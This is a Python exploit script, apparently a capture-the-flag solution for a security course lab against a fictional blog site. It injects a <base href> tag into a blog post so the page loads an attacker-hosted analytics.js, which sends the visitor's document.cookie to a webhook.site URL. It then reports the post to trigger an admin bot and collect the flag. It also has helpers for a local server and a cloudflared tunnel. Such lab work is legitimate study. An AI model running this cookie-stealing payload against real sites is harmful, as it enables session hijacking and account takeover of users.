import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite, CloudflareTunnel

import threading
from flask import Flask, send_file
import time
import html
import subprocess
import re

BASE_URL = "https://engineering.quoccacorp.com"
HTML_FILENAME = "index.html"

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8000

app = Flask(__name__)

@app.route('/')
def index():
    return send_file(HTML_FILENAME)

@app.route("/analytics.js")
def payload():
    return send_file("analytics.js")

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()
        self.cloudflared_process = None

    def __del__(self):
        if hasattr(self, "cloudflared_process") and self.cloudflared_process:
            self.cloudflared_process.terminate()

    # Paste into https://csp-evaluator.withgoogle.com
    def get_csp(self, url: str = BASE_URL) -> str:
        response = self.session.get(url)
        return response.headers["Content-Security-Policy"]

    # /analytics.js
    def scrape_root_relative_script_path(self) -> str:
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")

        target_script_element = soup.find_all("script", src=True)[-1]
        return target_script_element["src"]

    def start_local_server(self, host=SERVER_HOST, port=SERVER_PORT):
        threading.Thread(target=lambda: app.run(host, port), daemon=True).start()

    # Note: Delete all files in ~/.cloudflared except cert.pem
    def start_cloudflared_tunnel(self, port=SERVER_PORT) -> str:
        self.cloudflared_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        for line in self.cloudflared_process.stdout:
            # print("[cloudflared]", line.strip())
            if match := re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line):
                cf_public_url = match.group(0)
                print(f"✅ Tunnel URL: {cf_public_url}")
                break

        return cf_public_url

    # def main(self):
    #     print(self.webhooksite.view_url)
    #     print(self.webhooksite.url)

    #     print(self.get_csp())

    #     script_path = self.scrape_root_relative_script_path()

    #     JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`); console.log(123)'
    #     with open(script_path.lstrip('/'), 'w') as f:
    #         f.write(JS_PAYLOAD)

    #     HTML_PAYLOAD = f'<script src="{script_path}"></script>'
    #     with open(HTML_FILENAME, 'w') as f:
    #         f.write(f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n" + HTML_PAYLOAD)

    #     self.start_local_server()

    #     time.sleep(9)

    #     # cf_public_url = self.start_cloudflared_tunnel()

    #     PAYLOAD = f'<base href="https://z5437741.web.cse.unsw.edu.au/">'
    #     print(PAYLOAD)
    #     response = self.session.post(f"{BASE_URL}/posts", data={"title": PAYLOAD, "content": PAYLOAD})

    #     # Report Blog Post
    #     response = self.session.post(f"{response.url}/report")
    #     print(response.text)

    #     self.webhooksite.find_flags()

    #     while True:
    #         time.sleep(1)

    def main(self):
        print(self.webhooksite.view_url)
        print(self.webhooksite.url)

        script_path = self.scrape_root_relative_script_path()

        JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`); console.log(123);'
        with open(script_path.lstrip('/'), 'w') as f:
            f.write(JS_PAYLOAD)

        HTML_PAYLOAD = f'<script src="{script_path}"></script>'
        with open(HTML_FILENAME, 'w') as f:
            f.write(f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n" + HTML_PAYLOAD)

        # self.start_local_server()

        # time.sleep(9)

        # cf_public_url = self.start_cloudflared_tunnel()

        PAYLOAD = f'<base href="https://z5437741.web.cse.unsw.edu.au/">'
        print(PAYLOAD)
        response = self.session.post(f"{BASE_URL}/posts", data={"title": PAYLOAD, "content": PAYLOAD})
        print(response.url)

        # Report Blog Post
        response = self.session.post(f"{response.url}/report")
        print(response.text)

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
